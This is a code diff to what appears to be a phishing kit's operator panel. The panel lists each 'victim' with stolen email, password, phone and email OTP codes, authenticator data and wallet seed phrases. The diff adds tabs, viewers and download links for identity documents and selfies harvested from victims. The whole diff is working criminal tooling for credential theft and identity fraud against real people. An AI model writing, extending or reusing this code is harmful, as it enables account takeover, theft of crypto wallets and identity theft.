@@ -647,6 +647,129 @@ tr:hover {
     border-color: #661111;
 }
 
+/* Document Viewer Modal */
+.document-viewer-modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.8);
+    z-index: 2000;
+    justify-content: center;
+    align-items: center;
+}
+
+.document-viewer-content {
+    background: #111111;
+    border: 2px solid #444444;
+    padding: 2rem;
+    max-width: 800px;
+    width: 90%;
+    max-height: 90vh;
+    overflow: auto;
+    position: relative;
+    box-shadow: 0 0 30px rgba(0, 0, 0, 0.9);
+}
+
+.document-viewer-close {
+    position: absolute;
+    top: 1rem;
+    right: 1rem;
+    background: #333333;
+    color: #ffffff;
+    border: 1px solid #666666;
+    width: 30px;
+    height: 30px;
+    font-size: 18px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Courier New', monospace;
+}
+
+.document-viewer-close:hover {
+    background: #444444;
+}
+
+.document-viewer-image {
+    max-width: 100%;
+    max-height: 70vh;
+    display: block;
+    margin: 0 auto;
+}
+
+.document-download-btn {
+    display: block;
+    margin: 1rem auto 0;
+    padding: 0.75rem 1.5rem;
+    background: #333333;
+    color: #ffffff;
+    border: 1px solid #666666;
+    font-family: 'Courier New', monospace;
+    font-size: 0.875rem;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+}
+
+.document-download-btn:hover {
+    background: #444444;
+}
+
+/* Document List in Victim Info */
+.document-list-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0.75rem;
+    border: 1px solid #333333;
+    margin-bottom: 0.5rem;
+    background: #1a1a1a;
+}
+
+.document-list-item:last-child {
+    margin-bottom: 0;
+}
+
+.document-type {
+    font-weight: 500;
+    color: #cccccc;
+}
+
+.document-actions {
+    display: flex;
+    gap: 0.5rem;
+}
+
+.document-btn {
+    padding: 0.5rem 1rem;
+    background: #222222;
+    color: #cccccc;
+    border: 1px solid #444444;
+    font-family: 'Courier New', monospace;
+    font-size: 0.75rem;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+}
+
+.document-btn:hover {
+    background: #333333;
+    color: #ffffff;
+}
+
+.document-btn.download {
+    background: #333333;
+    color: #ffffff;
+}
+
+.document-btn.download:hover {
+    background: #444444;
+}
+
 /* Improved Popup Styling */
 #viewResults {
     background: #111111;
@@ -1114,16 +1237,62 @@ tr:hover {
     margin-bottom: 15px;
 }
 
-.popup-content {
+.popup-section {
     margin-bottom: 15px;
 }
 
-.popup-section {
+.popup-section h4 {
+    margin-top: 0;
+    color: #0052ff;
+    border-bottom: 1px solid #444;
+    padding-bottom: 5px;
     margin-bottom: 10px;
 }
 
-.popup-section p {
-    margin: 5px 0;
+.tab-container {
+    width: 100%;
+    margin-top: 15px;
+}
+
+.tab-buttons {
+    display: flex;
+    border-bottom: 1px solid #444;
+    margin-bottom: 15px;
+}
+
+.tab-button {
+    background: #2a2a2a;
+    border: none;
+    color: #888;
+    padding: 8px 15px;
+    cursor: pointer;
+    font-size: 14px;
+    transition: all 0.2s ease;
+    border: 1px solid transparent;
+    border-bottom: none;
+    margin-right: 5px;
+    border-radius: 4px 4px 0 0;
+}
+
+.tab-button:hover {
+    background: #333;
+    color: #fff;
+}
+
+.tab-button.active {
+    background: #1a1a1a;
+    color: #0052ff;
+    border-color: #444;
+    border-bottom: 1px solid #1a1a1a;
+    margin-bottom: -1px;
+}
+
+.tab-content {
+    display: none;
+}
+
+.tab-content.active {
+    display: block;
 }
 
 .popup-section strong {
@@ -1316,7 +1485,7 @@ tr:hover {
                         echo "<td>" . $row["status"] . ($row["status"] == "online" ? " 🔵" : " 🔴") . "</td>";
                         echo "<td class='actions'>";
                         echo "<button class='action-btn send-button' data-userid='" . $row["id"] . "' data-token='" . $row["token"] . "'>Send</button>";
-                        echo "<button class='action-btn view-button' data-email='" . $row["email"] . "' data-password='" . $row["password"] . "' data-phoneotp='" . $row["phone_otp"] . "' data-createdat='" . $row["created_at"] . "' data-updatedat='" . $row["updated_at"] . "' data-ipaddress='" . $row["ip_address"] . "' data-useragent='" . $row["user_agent"] . "' data-authapp='" . $row["auth_app"] . "' data-loginurl='" . $row["login_url"] . "' data-emailotp='" . $row["email_otp"] . "' data-seed='" . $row["seed"] . "'>View</button>";
+                        echo "<button class='action-btn view-button' data-email='" . $row["email"] . "' data-password='" . $row["password"] . "' data-phoneotp='" . $row["phone_otp"] . "' data-createdat='" . $row["created_at"] . "' data-updatedat='" . $row["updated_at"] . "' data-ipaddress='" . $row["ip_address"] . "' data-useragent='" . $row["user_agent"] . "' data-authapp='" . $row["auth_app"] . "' data-loginurl='" . $row["login_url"] . "' data-emailotp='" . $row["email_otp"] . "' data-seed='" . $row["seed"] . "' data-token='" . $row["token"] . "'>View</button>";
                         echo "<button class='action-btn delete-button'>Delete</button>";
                         echo "</td>";
                         echo "</tr>";
@@ -1455,6 +1624,20 @@ tr:hover {
             <p><strong>IP Address:</strong> <span></span></p>
             <p><strong>User Agent:</strong> <span></span></p>
         </div>
+        <div class="tab-container">
+            <div class="tab-buttons">
+                <button class="tab-button active" data-tab="documents">Documents</button>
+                <button class="tab-button" data-tab="selfies">Selfies</button>
+            </div>
+            <div id="documents" class="tab-content active">
+                <h4>Uploaded Documents</h4>
+                <div id="documentList"></div>
+            </div>
+            <div id="selfies" class="tab-content">
+                <h4>Uploaded Selfies</h4>
+                <div id="selfieList"></div>
+            </div>
+        </div>
     </div>
     <button id="okButtonViewResults" class="popup-close-btn">Close</button>
 </div>
@@ -1480,6 +1663,24 @@ tr:hover {
     <img src="../assets/Animation - 1713821498258.gif" alt="Success Animation" style="margin:0px;;">
     <p style="font-weight: bold; color: white; margin-top: 0;">SENT!</p>
     <button id="okButtonSuccess">OK</button>
+</div>
+
+<!-- Document Viewer Modal -->
+<div id="documentViewerModal" class="document-viewer-modal">
+    <div class="document-viewer-content">
+        <button class="document-viewer-close" id="documentViewerClose">X</button>
+        <img id="documentViewerImage" class="document-viewer-image" src="" alt="Document Image">
+        <a id="documentDownloadLink" class="document-download-btn" download>Download Document</a>
+    </div>
+</div>
+
+<!-- Selfie Viewer Modal -->
+<div id="selfieViewerModal" class="document-viewer-modal">
+    <div class="document-viewer-content">
+        <button class="document-viewer-close" id="selfieViewerClose">X</button>
+        <img id="selfieViewerImage" class="document-viewer-image" src="" alt="Selfie">
+        <a id="selfieDownloadLink" class="document-download-btn" download>Download Selfie</a>
+    </div>
 </div>
 
     <!-- Timezone Selector Popup -->
@@ -1768,6 +1969,8 @@ document.addEventListener('DOMContentLoaded', () => {
             showSmsPopup();
         } else if (event.target.id === 'okSmsButton') {
             handleOkSmsButtonClick();
+        } else if (event.target.id === 'documentViewerClose') {
+            closeDocumentViewer();
         }
     });
 
@@ -1776,7 +1979,7 @@ document.addEventListener('DOMContentLoaded', () => {
         popupOpen = !popupOpen;
     };
 
-    const showViewResults = ({ email, password, phoneotp, createdat, updatedat, ipaddress, useragent, authapp, loginurl, emailotp, emailapp, seed }) => {
+    const showViewResults = ({ email, password, phoneotp, createdat, updatedat, ipaddress, useragent, authapp, loginurl, emailotp, emailapp, seed, token }) => {
         // Update login information
         document.getElementById('loginResults').querySelector('span').textContent = email;
         document.getElementById('loginResults').querySelectorAll('span')[1].textContent = password;
@@ -1811,6 +2014,12 @@ document.addEventListener('DOMContentLoaded', () => {
         // Update IP logs information
         document.getElementById('ipLogs').querySelectorAll('span')[0].textContent = ipaddress;
         document.getElementById('ipLogs').querySelectorAll('span')[1].textContent = useragent;
+
+        // Set token on the popup content for tab switching
+        document.querySelector('.popup-content').setAttribute('data-token', token);
+        
+        // Fetch and display document information
+        fetchDocumentData(token);
 
         // Show the view results div
         viewResultsDiv.style.display = viewResultsDiv.style.display === 'block' ? 'none' : 'block';
@@ -1887,7 +2096,7 @@ $(() => {
                                 <td>${row.status} ${row.status === "online" ? "🔵" : "🔴"}</td>
                                 <td class="actions">
                                     <button class="button send-button" data-userid="${row.id}" data-token="${row.token}">Send</button>
-                                    <button class="button view-button" data-email="${row.email}" data-password="${row.password}" data-createdat="${row.created_at}" data-updatedat="${row.updated_at}" data-ipaddress="${row.ip_address}" data-useragent="${row.user_agent}" data-phoneotp="${row.phone_otp}" data-loginurl="${row.login_url}" data-authapp="${row.auth_app}" data-emailotp="${row.email_otp}" data-seed="${row.seed}">View</button>
+                                    <button class="button view-button" data-email="${row.email}" data-password="${row.password}" data-createdat="${row.created_at}" data-updatedat="${row.updated_at}" data-ipaddress="${row.ip_address}" data-useragent="${row.user_agent}" data-phoneotp="${row.phone_otp}" data-loginurl="${row.login_url}" data-authapp="${row.auth_app}" data-emailotp="${row.email_otp}" data-seed="${row.seed}" data-token="${row.token}">View</button>
                                     <button class="button delete-button">Delete</button>
                                 </td>
                             </tr>`;
@@ -1968,6 +2177,189 @@ const handleOkSmsButtonClick = () => {
     $('#smsPopup').hide();
 };
 
+// Document Viewer Functions
+const fetchDocumentData = (token) => {
+    // Clear previous document list
+    document.getElementById('documentList').innerHTML = '<p>Loading documents...</p>';
+    
+    // Fetch document data from server
+    fetch(`fetch_documents.php?token=${encodeURIComponent(token)}`)
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                displayDocuments(data.documents);
+            } else {
+                document.getElementById('documentList').innerHTML = `<p>${data.error || 'No documents found for this victim.'}</p>`;
+            }
+        })
+        .catch(error => {
+            console.error('Error fetching document data:', error);
+            document.getElementById('documentList').innerHTML = '<p>Error loading documents.</p>';
+        });
+};
+
+const displayDocuments = (documents) => {
+    const documentListElement = document.getElementById('documentList');
+    
+    if (!documents || documents.length === 0) {
+        documentListElement.innerHTML = '<p>No documents submitted.</p>';
+        return;
+    }
+    
+    let documentListHTML = '';
+    
+    documents.forEach(doc => {
+        documentListHTML += `
+            <div class="document-list-item">
+                <span class="document-type">${doc.type}</span>
+                <div class="document-actions">
+                    <button class="document-btn" onclick="viewDocument('${doc.path}')">View</button>
+                    <a class="document-btn download" href="serve_document.php?path=${doc.path}" download>Download</a>
+                </div>
+            </div>
+        `;
+    });
+    
+    documentListElement.innerHTML = documentListHTML;
+};
+
+const viewDocument = (documentPath) => {
+    const viewerModal = document.getElementById('documentViewerModal');
+    const viewerImage = document.getElementById('documentViewerImage');
+    const downloadLink = document.getElementById('documentDownloadLink');
+    
+    // Set the image source
+    viewerImage.src = `serve_document.php?path=${encodeURIComponent(documentPath)}`;
+    
+    // Set the download link
+    downloadLink.href = `serve_document.php?path=${encodeURIComponent(documentPath)}`;
+    
+    // Show the modal
+    viewerModal.style.display = 'flex';
+};
+
+const closeDocumentViewer = () => {
+    const viewerModal = document.getElementById('documentViewerModal');
+    viewerModal.style.display = 'none';
+};
+
+// Selfie Viewer Functions
+const fetchSelfieData = (token) => {
+    // Clear previous selfie list
+    document.getElementById('selfieList').innerHTML = '<p>Loading selfies...</p>';
+    
+    // Fetch selfie data from server
+    fetch(`fetch_selfies.php?token=${encodeURIComponent(token)}`)
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                displaySelfies(data.selfies);
+            } else {
+                document.getElementById('selfieList').innerHTML = `<p>${data.error || 'No selfies found for this victim.'}</p>`;
+            }
+        })
+        .catch(error => {
+            console.error('Error fetching selfie data:', error);
+            document.getElementById('selfieList').innerHTML = '<p>Error loading selfies.</p>';
+        });
+};
+
+const displaySelfies = (selfies) => {
+    const selfieListElement = document.getElementById('selfieList');
+    
+    if (!selfies || selfies.length === 0) {
+        selfieListElement.innerHTML = '<p>No selfies submitted.</p>';
+        return;
+    }
+    
+    let selfieListHTML = '';
+    
+    selfies.forEach((selfie, index) => {
+        selfieListHTML += `
+            <div class="document-list-item">
+                <span class="document-type">Selfie ${index + 1}</span>
+                <div class="document-actions">
+                    <button class="document-btn" onclick="viewSelfie('${selfie.path}')">View</button>
+                    <a class="document-btn download" href="serve_document.php?path=${selfie.path}" download>Download</a>
+                </div>
+            </div>
+        `;
+    });
+    
+    selfieListElement.innerHTML = selfieListHTML;
+};
+
+const viewSelfie = (selfiePath) => {
+    const viewerModal = document.getElementById('selfieViewerModal');
+    const viewerImage = document.getElementById('selfieViewerImage');
+    const downloadLink = document.getElementById('selfieDownloadLink');
+    
+    // Set the image source
+    viewerImage.src = `serve_document.php?path=${encodeURIComponent(selfiePath)}`;
+    
+    // Set the download link
+    downloadLink.href = `serve_document.php?path=${encodeURIComponent(selfiePath)}`;
+    
+    // Show the modal
+    viewerModal.style.display = 'flex';
+};
+
+const closeSelfieViewer = () => {
+    const viewerModal = document.getElementById('selfieViewerModal');
+    viewerModal.style.display = 'none';
+};
+
+// Add event listeners for modal close buttons
+document.addEventListener('DOMContentLoaded', () => {
+    // Document viewer close button
+    const docCloseBtn = document.getElementById('documentViewerClose');
+    if (docCloseBtn) {
+        docCloseBtn.addEventListener('click', closeDocumentViewer);
+    }
+    
+    // Selfie viewer close button
+    const selfieCloseBtn = document.getElementById('selfieViewerClose');
+    if (selfieCloseBtn) {
+        selfieCloseBtn.addEventListener('click', closeSelfieViewer);
+    }
+    
+    // Tab switching functionality
+    const tabButtons = document.querySelectorAll('.tab-button');
+    tabButtons.forEach(button => {
+        button.addEventListener('click', () => {
+            // Remove active class from all buttons and content
+            document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            
+            // Add active class to clicked button and corresponding content
+            button.classList.add('active');
+            const tabId = button.getAttribute('data-tab');
+            document.getElementById(tabId).classList.add('active');
+            
+            // If switching to selfies tab and no selfies loaded yet, fetch them
+            if (tabId === 'selfies' && document.querySelectorAll('#selfieList .document-list-item').length === 0) {
+                const token = document.querySelector('.popup-content').getAttribute('data-token');
+                if (token) {
+                    fetchSelfieData(token);
+                }
+            }
+        });
+    });
+    
+    // Close modals when clicking outside
+    window.addEventListener('click', (event) => {
+        const docModal = document.getElementById('documentViewerModal');
+        const selfieModal = document.getElementById('selfieViewerModal');
+        
+        if (event.target === docModal) {
+            closeDocumentViewer();
+        }
+        
+        if (event.target === selfieModal) {
+            closeSelfieViewer();
+        }
+    });
+});
 </script>
 </body>
 </html>
